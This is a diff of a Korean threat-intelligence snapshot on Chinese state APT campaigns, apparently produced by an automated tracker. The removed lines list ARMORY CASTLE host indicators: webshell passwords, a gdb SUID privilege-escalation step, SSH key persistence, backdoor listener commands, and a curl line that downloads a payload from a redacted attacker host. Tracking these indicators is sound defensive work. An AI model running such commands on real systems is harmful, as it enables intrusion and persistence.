@@ -1,15 +1,13 @@
-# China State APT Campaign Snapshot — 2026-11-21 UTC
+# China State APT Campaign Snapshot — 2026-11-22 UTC
 
 ## 수집 상태
-- 페치 성공: [GTIG — ARMORY CASTLE Exploits vSphere](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere)(신규, 공개 2026-11-19); [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence)(색인, 최근 11건 확인 — China/PRC-nexus 신규 게시물은 ARMORY CASTLE/vSphere뿐, COLD RELIC·XCPE Botnet은 비중국으로 확인 후 제외); [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/)(색인, 최신 9건 모두 China 비관련)
-- 페치 차단(DNS 미해석/ENOTFOUND): www.ic3.gov(AA26-281A 원문 PDF), www.nextgov.com(Volt Typhoon "Silent Train" 재보도)
-- 검증된 IOC: 신규 11개(IP, 누적 도메인 35·IP 42·해시 61) / 미검증 IOC: 신규 0개(누적 도메인 0·IP 0) / 신규 CVE: 1건(검증, CVE-2026-123890 — 누적 29, 검증 13/미검증 16)
+- 페치 성공: [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence)(색인, 최근 11건 확인 — 2026-11-19 ARMORY CASTLE/vSphere 이후 신규 China/PRC-nexus 게시물 없음. COLD RELIC·XCPE Botnet·ShinyHunters·기타 신규 게시물 확인했으나 러시아 FSB 연계·금전적 동기 봇넷·비국가 사이버범죄로 국가 배후 첩보 활동 기준 미충족); [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/)(색인, 2026-11-05~11-20 게시물 8건 확인 — China/Typhoon/국가 배후 관련 신규 게시물 없음)
+- 페치 차단(EGRESS_BLOCKED/DNS 미해석): cisa.gov, ic3.gov, cyber.gov.au, therecord.media, securityweek.com, thehackernews.com, darktrace.com, cybersecuritydive.com
+- 검증된 IOC: 신규 0개(누적 도메인 35·IP 42·해시 61, 변동 없음) / 미검증 IOC: 신규 0개(누적 도메인 0·IP 0) / 신규 CVE: 0건(누적 29건, 검증 13/미검증 16)
 
-6개 정기 WebSearch 쿼리와 추가 타겟 검색(SecurityScorecard/Volt Typhoon 과거 보고서 재확인, Positive Technologies/APT31-러시아 캠페인, AA26-281A 상세, Mandiant/APT41 사례 날짜 확인, GTIG·Microsoft 블로그 신규 게시물 확인)을 수행했습니다. GTIG 블로그 색인에서 2026-11-19 공개된 신규 포스트 "ARMORY CASTLE Exploits vSphere"를 식별·페치해 전문을 확보했습니다 — 기존에 이미 등재된 PRC-nexus 행위자 ARMORY CASTLE(구 UNC5221)이 BeyondTrust Remote Support 제로데이(CVE-2026-102764, 2026-10-15 공개) 경유 침투 후 내부 Linux 어플라이언스로 측면이동해 VMware vCenter 제로데이 CVE-2026-123890(인증 없는 SRP-6a 세션키 노출→administrator@vsphere.local 인증우회, DCE/RPC 2012포트)을 신규로 익스플로잇한 사실과 7종의 신규 툴셋, "Suspected Obfuscation Network"로 서술된 압수된 제3자 방화벽·라우터 IP 11건을 확인해 전부 검증 IOC로 반영했습니다. 같은 색인에서 신규 포스트 2건(COLD RELIC, XCPE Botnet)을 추가로 확인했으나, COLD RELIC은 원문이 러시아 FSB 연계(COLDRIVER/UNC4057)로 명시하고 있어 제외했고, XCPE Botnet은 중국 소재 OEM 업체 Videostrong Technology가 운영한 금전적 동기의 광고사기·레지덴셜프록시 봇넷으로 서술되어(국가 배후 첩보 활동 기준 미충족) 제외했습니다.
+6개 정기 WebSearch 쿼리를 수행했으나 금일 신규로 확인된 캠페인은 없습니다. 검색 과정에서 발견한 후보 3건(RedNovember, CL-STA-1087, Royal Thai Police/Yokai — Mustang Panda)은 모두 공개일 기준 60일 창(2026-09-23~) 밖으로 확인되어 미채택했습니다: RedNovember(Recorded Future, 1차 공개 2025-09-24, 분석 마감 2025-07-25), CL-STA-1087(Unit 42, 공개 2026-03-17), Royal Thai Police/Yokai(Darktrace/Cado, 공개 2025-02-25). GTIG·Microsoft 블로그 색인을 재확인해 2026-11-19 ARMORY CASTLE/vSphere 게시물 이후 신규 China-nexus 포스트가 없음을 확인했습니다.
 
-AA26-281A(FBI/CISA/NSA/NCSC-UK 공동권고, 2026-10-08 공개)의 정식 명칭과 "Flax Typhoon과 기술적으로 일치"라는 서술을 재보도로 추가 확인했으나, 1차 출처(ic3.gov, cyber.gov.au) 전량 EGRESS_BLOCKED로 미검증 유지한 채 기존 Integrity Technology Group 행 메타데이터만 보강했습니다. Volt Typhoon "Silent Train"(nextgov.com 재보도)·SecurityScorecard의 과거(2024) New Caledonia VPN 브릿지 보고서·Positive Technologies의 APT31-러시아 IT섹터 캠페인(2024~2025 활동, 2025-11 공개로 60일 창 밖)·Mandiant APT41 선적/물류 캠페인(2024-07 공개, 60일 창 밖)은 모두 신규 반영 기준 미충족으로 미채택했습니다.
-
-60일 창이 2026-09-22~로 이동했습니다. 기존 12건 캠페인 모두 창 내 유지. 금일 신규 캠페인 1건(ARMORY CASTLE/vCenter CVE-2026-123890) 추가로 총 13건. 7일 창(2026-11-14~2026-11-21) 기준 LEAKY CASTLE/CAIRN(11-16)·ARMORY CASTLE/vCenter(11-19) 2건 🔥.
+60일 창이 2026-09-23~로 이동했습니다. 기존 13건 캠페인 모두 창 내 유지(Red Heron·Phantom Taurus의 근사 공개일 "2026-09-22경"/"2026-09"는 원문 미확보로 날짜 보정 불가하여 기존 분류를 유지). 금일 신규 캠페인 없음. 7일 창(2026-11-15~2026-11-22) 기준 LEAKY CASTLE/CAIRN(11-16)·ARMORY CASTLE/vCenter(11-19) 2건 🔥(전일 대비 변동 없음, 창 내 유지).
 
 ## 최근 캠페인 (최근 60일)
 
@@ -19,7 +17,7 @@ AA26-281A(FBI/CISA/NSA/NCSC-UK 공동권고, 2026-10-08 공개)의 정식 명칭
 - 초기 침투: BeyondTrust Remote Support(구 Bomgar) 제로데이 CVE-2026-102764(기존 2026-10-15 공개) 경유 침투 → 내부 Linux 어플라이언스로 측면이동 → VMware vCenter 제로데이 CVE-2026-123890(인증 없는 SRP-6a 세션키 노출, DCE/RPC 2012포트, administrator@vsphere.local 인증우회) 추가 익스플로잇
 - 주요 도구/멀웨어: SLIMSAVAGE(JSP 웹셸 `ActiveSer.jsp`, 암호 `pwd=123`), CAGEMATCH(JSP 파일스테이징 웹셸 `u.jsp`), BEARBONES(백도어 Dropbear SSH `/tmp/dbr`, 평문 자격증명 로깅, 배너 `SSH-2.0-pulsesecure_23345`, TCP 53·33992 리슨), BONESAW(Go 익스플로잇 유틸 `/tmp/123`, CVE-2026-123890 익스플로잇), SAWSNAKE(Go SAML 유틸 `/tmp/sss`, Golden SAML 위조), LAZYBONES(Go 백도어 `/usr/bin/vmtoolscs`, Slack API C2, systemd 서비스 50분 주기 재시작·150~450초 지터), vmfs_browser.py(VMFS 볼륨 추출 파이썬 툴, `vmfs-pydist.tar.gz`). 보조 툴: nmap, curl, RAR, WinSCP, gdb
 - 관측 시점: BONESAW 실행 2026년 9월 초(CVE-2026-123890 익스플로잇 시점), BONESAW Go 빌드 타임스탬프 2026-07-13T09:21:24Z(변조 가능성 있음), CVE-2026-123890 공개 2026-11-19(VMware·GTIG 동시 공개)
-- 출처: [GTIG](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere) — 2026-11-19 — fetched(금일)
+- 출처: [GTIG](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere) — 2026-11-19 — fetched(이전 실행)
 
 ### LEAKY CASTLE(PRC 계약업체) 및 CAIRN 프레임워크 — AI/LLM 기반 사이버첩보 활동, 미 항공우주 섹터 표적 🔥
 - 귀속: 귀속 미확인 — 원문 인용: "a PRC contractor"(LEAKY CASTLE, GTIG, 검증) / "suspected espionage threat actors with a PRC nexus"·"PRC-nexus cyber espionage actors used LLM tools and models for reconnaissance, front-end scanning, researching targets across various sectors and geographies, and weaponizing exploits"(GTIG, 검증, 2026-11-16). PLA/MSS 명시 없음.
@@ -118,48 +116,33 @@ AA26-281A(FBI/CISA/NSA/NCSC-UK 공동권고, 2026-10-08 공개)의 정식 명칭
 - 출처: 검색 결과만 확인 — CrowdStrike(DNS 미해석), 재보도(다수)
 
 ## 그룹 별칭 매핑
-전체 누적 그룹 목록(마지막 관측일 포함)은 [`groups.md`](../groups.md) 참조. 금일 신규 그룹 없음 — ARMORY CASTLE(구 UNC5221) 행 갱신(신규 캠페인·CVE·IP·마지막 관측일 2026-11-19), Integrity Technology Group 행 보강(AA26-281A 정식 명칭·Flax Typhoon 연계 서술 추가, 미검증 유지).
+전체 누적 그룹 목록(마지막 관측일 포함)은 [`groups.md`](../groups.md) 참조. 금일 신규 그룹 없음, 그룹 메타데이터 변경 없음.
 
 ## 악용 CVE (패치 우선순위)
-신규 검증 CVE 1건: CVE-2026-123890 — VMware vCenter Server(인증 없는 SRP-6a 세션키 노출, 인증우회), ARMORY CASTLE(구 UNC5221), 2026-11-19(GTIG, 검증). 전체 누적 목록은 [`exploited-cves.txt`](../exploited-cves.txt) 참조(29건, 검증 13 / 미검증 16).
+금일 신규 CVE 없음. 전체 누적 목록은 [`exploited-cves.txt`](../exploited-cves.txt) 참조(29건, 검증 13 / 미검증 16).
 
 ## C2 도메인 (35, 누적)
 신규 없음. 전체 목록은 [`blocklists/domains.txt`](../blocklists/domains.txt) 참조.
 
 ## C2 IP (42, 누적)
-신규 11건 — ARMORY CASTLE/vCenter 캠페인(GTIG, 2026-11-19, "Suspected Obfuscation Network"로 서술된 압수된 제3자 방화벽·라우터, BEARBONES 배너 노출):
-- 103.147.251.5, 103.190.38.3, 118.174.128.34, 118.174.128.36, 118.174.128.38, 176.9.89.66, 185.71.15.109, 220.121.128.41, 222.108.77.44, 61.216.56.127, 81.45.89.43
-
-전체 목록은 [`blocklists/ips.txt`](../blocklists/ips.txt) 참조.
+신규 없음. 전체 목록은 [`blocklists/ips.txt`](../blocklists/ips.txt) 참조.
 
 ## 파일 해시 (61, 누적)
-신규 없음. ARMORY CASTLE/vCenter 캠페인(2026-11-19)의 해시는 원문 본문에 미게시(VirusTotal GTI 컬렉션 링크만 제공, 로그인 필요)되어 반영하지 않음. 기존 61건은 이전 스냅샷([`snapshots/2026-08-27.md`](2026-08-27.md), [`snapshots/2026-08-28.md`](2026-08-28.md), [`snapshots/2026-09-03.md`](2026-09-03.md), [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-09-25.md`](2026-09-25.md), [`snapshots/2026-10-01.md`](2026-10-01.md), [`snapshots/2026-10-16.md`](2026-10-16.md)) 참조.
+신규 없음. 기존 61건은 이전 스냅샷([`snapshots/2026-08-27.md`](2026-08-27.md), [`snapshots/2026-08-28.md`](2026-08-28.md), [`snapshots/2026-09-03.md`](2026-09-03.md), [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-09-25.md`](2026-09-25.md), [`snapshots/2026-10-01.md`](2026-10-01.md), [`snapshots/2026-10-16.md`](2026-10-16.md)) 참조.
 
 ## 호스트 IOC · LOTL 아티팩트
-신규 — ARMORY CASTLE/vCenter 캠페인(GTIG, 2026-11-19, 검증):
-- `gdb`로 `/bin/env`에 SUID 비트 설정 → 임의 사용자 root 실행
-- BEARBONES 백도어 리스너: TCP 53, TCP 33992
-- vCenter에 로컬 관리자 계정 `sps-<REDACTED>@vsphere.local` 생성
-- BONESAW가 `vmdir` 경유 SSO admin 계정 및 백도어 머신 계정 생성
-- `PUT /rest/appliance/access/ssh`로 SSH 활성화 → 자격증명 탈취 후 비활성화
-- ESXi root `authorized_keys`에 SSH 공개키 추가, 개인키는 `/tmp/123.key`에 스테이징
-- VMFS 볼륨에 숨김 디렉터리 `.a` 생성
-- LAZYBONES systemd 서비스, 50분 주기 재시작·150~450초 지터
-- SAWSNAKE 및 실행 결과물을 `rm`으로 삭제(안티포렌식)
-- 주요 명령: `/tmp/dbr -R -p 53`, `/tmp/dbr -R -p 33992`, `curl -o /tmp/123.rar -k https://<REDACTED>/content/r.js`
-
-기존 항목은 [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-10-16.md`](2026-10-16.md), [`snapshots/2026-11-03.md`](2026-11-03.md) 참조.
+신규 없음. 기존 항목은 [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-10-16.md`](2026-10-16.md), [`snapshots/2026-11-03.md`](2026-11-03.md), [`snapshots/2026-11-21.md`](2026-11-21.md) 참조.
 
 ## 이번 실행 변경사항
-- 신규 캠페인: ARMORY CASTLE(구 UNC5221) — VMware vCenter 제로데이(CVE-2026-123890) 추가 익스플로잇(검증) 1건
-- 신규 IOC: IP 11건(검증, ARMORY CASTLE/vCenter 캠페인)
-- 신규 CVE: CVE-2026-123890(검증) 1건
+- 신규 캠페인: 없음
+- 신규 IOC: 없음
+- 신규 CVE: 없음
 - 제거: 없음
-- 캠페인 목록 변동: 12건 → 13건(신규 1건 추가, 기존 12건 전부 60일 창 내 유지)
+- 캠페인 목록 변동: 13건 유지(신규 없음, 전부 60일 창 내 유지)
 - 승격(미검증→검증): 없음
 - 귀속 변경: 없음
-- 그룹 메타데이터 갱신: ARMORY CASTLE(마지막 관측 2026-10-15→2026-11-19), Integrity Technology Group(AA26-281A 정식 명칭·Flax Typhoon 연계 서술 보강, 미검증 유지)
-- 비고: WebFetch 총 4건 시도(성공 2 — GTIG 블로그 색인, Microsoft 블로그 색인 / 추가 성공 1 — ARMORY CASTLE/vSphere 원문 / 실패 2 — ic3.gov, nextgov.com 모두 DNS 미해석). GTIG 블로그 색인에서 발견한 COLD RELIC(러시아 FSB 연계)·XCPE Botnet(China 소재 OEM의 금전적 동기 봇넷)은 국가 배후 첩보 활동 기준 미충족으로 미채택. AA26-281A 1차 출처(ic3.gov, cyber.gov.au)는 계속 EGRESS_BLOCKED로 미검증 유지.
+- 그룹 메타데이터 갱신: 없음
+- 비고: WebFetch 2건 시도(성공 2 — GTIG 블로그 색인, Microsoft 블로그 색인). 두 색인 모두 전일(2026-11-21) 확인된 최신 게시물(ARMORY CASTLE/vSphere, 2026-11-19) 이후 신규 China/PRC-nexus 콘텐츠가 없음을 확인. WebSearch 과정에서 발견한 RedNovember(Recorded Future)·CL-STA-1087(Unit 42)·Royal Thai Police/Yokai(Darktrace, Mustang Panda 연계)는 모두 1차 공개일이 60일 창(2026-09-23~) 밖으로 확인되어 미채택.
 
 ## 차단 운영 포맷 (복붙용)
 
@@ -249,13 +232,13 @@ www.twisinbeth.com
 ```
 
 ## 출처
-- [ARMORY CASTLE Exploits vSphere](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere) — Google GTIG — 2026-11-19 — fetched(금일)
+- [ARMORY CASTLE Exploits vSphere](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere) — Google GTIG — 2026-11-19 — fetched(이전 실행)
 - [GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold](https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold) — Google GTIG — 2026-11-16 — fetched(이전 실행)
 - [ARTEX and Friends: Enter Agentic Offensive Frameworks](https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks) — Google GTIG/Mandiant — 2026-10-30 — fetched(이전 실행)
 - [AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise](https://www.microsoft.com/en-us/security/blog/2026/10/21/storm-0940-uses-artex-agentic-ai-connectwise-supply-chain-compromise/) — Microsoft — 2026-10-21 — fetched(이전 실행)
 - [ARMORY CASTLE Exploits BeyondTrust](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-beyondtrust) — Google GTIG — 2026-10-15 — fetched(이전 실행)
 - [NeedyMantis: Unpacking a post-compromise malware family used in targeted operations](https://www.microsoft.com/en-us/security/blog/2026/09/28/needymantis-unpacking-a-post-compromise-malware-family-used-in-targeted-operations/) — Microsoft — 2026-09-28 — fetched(이전 실행)
-- [Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data (AA26-281A)](https://www.cisa.gov/) — FBI/CISA/NSA/NCSC-UK — 2026-10-08 — blocked(ic3.gov ENOTFOUND, cyber.gov.au EGRESS_BLOCKED, 재보도 종합으로만 반영)
-- [China's Volt Typhoon quietly built another hacking network following US crackdown](https://www.nextgov.com/) — Nextgov (Lumen Black Lotus Labs 재인용) — 2026-10 — blocked(ENOTFOUND)
-- [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence) — Google GTIG — 2026-11-21 조회 — fetched(색인)
-- [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/) — Microsoft — 2026-11-21 조회 — fetched(색인, 신규 China/PRC-nexus 게시물 없음)
+- [Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data (AA26-281A)](https://www.cisa.gov/) — FBI/CISA/NSA/NCSC-UK — 2026-10-08 — blocked(EGRESS_BLOCKED, 재보도 종합으로만 반영)
+- [China's Volt Typhoon quietly built another hacking network following US crackdown](https://www.nextgov.com/) — Nextgov (Lumen Black Lotus Labs 재인용) — 2026-10 — blocked(EGRESS_BLOCKED)
+- [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence) — Google GTIG — 2026-11-22 조회 — fetched(색인, 신규 China-nexus 게시물 없음)
+- [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/) — Microsoft — 2026-11-22 조회 — fetched(색인, 신규 China-nexus 게시물 없음)
